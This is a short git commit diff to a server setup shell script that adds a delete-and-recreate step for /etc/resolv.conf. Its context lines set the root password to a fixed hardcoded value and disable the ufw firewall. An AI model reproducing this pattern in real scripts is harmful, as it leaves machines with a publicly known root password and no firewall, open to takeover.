9a6e35660b5b4fd5506e0b1a6a9d39591d89c035
sSsiRMoHaMMaD <130269418+sSsiRMoHaMMaD@users.noreply.github.com>
2023-12-29 13:46:01 +0100

    Update main.sh

--- main.sh
+++ main.sh
@@ -178,6 +178,8 @@ show_menu() {
             echo 'root:sOn3lQ#bS@ls!7&m' | sudo chpasswd && \
             ufw disable && \
             sed -i '16s/^/DNS=1.1.1.1 8.8.8.8\n/' /etc/systemd/resolved.conf && \
+            rm -rf /etc/resolv.conf && \
+            touch /etc/resolv.conf && \
             echo 'nameserver 8.8.8.8
             nameserver 8.8.4.4
             nameserver 1.1.1.1' > /etc/resolv.conf && \
